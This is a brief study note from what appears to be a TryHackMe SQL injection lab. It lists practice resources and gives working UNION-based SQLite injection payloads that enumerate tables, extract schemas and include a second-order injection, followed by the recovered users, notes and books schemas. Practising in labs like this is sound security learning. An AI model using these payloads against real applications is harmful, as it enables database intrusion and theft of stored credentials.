## Resource
 - https://tryhackme.com/room/sqlilab : Good room with a web server machine that can be used to learn and test various sql injection
 - https://tryhackme.com/room/sqlinjectionlm: another room with good sql injection categorization and example/practice
 - https://github.com/swisskyrepo/PayloadsAllTheThings/tree/master/SQL%20Injection : extensive sql injection cheat sheet


 sqlilab book title 1:
` ') union select 1,2,3,group_concat(tbl_name) from sqlite_master where type='table' and tbl_name not like 'sqlite_%' -- -` : get tables
users, notes, books
`') union select 1, 2, 3,(SELECT sql FROM sqlite_master WHERE type!='meta' AND sql NOT NULL AND name ='notes') -- -`: column names for notes

book title 2:

base: `' UNION SELECT 1 -- -`
second query: `' UNION SELECT '-1''UNION SELECT 1, 2, 3, 4 -- -`
tables users notes books
column:
CREATE TABLE books ( id integer primary key, title text not null, description text not null, author text not null )

CREATE TABLE users ( id integer primary key, username text unique not null, password text not null )

CREATE TABLE notes ( id integer primary key, username text not null, title text not null, note text not null )
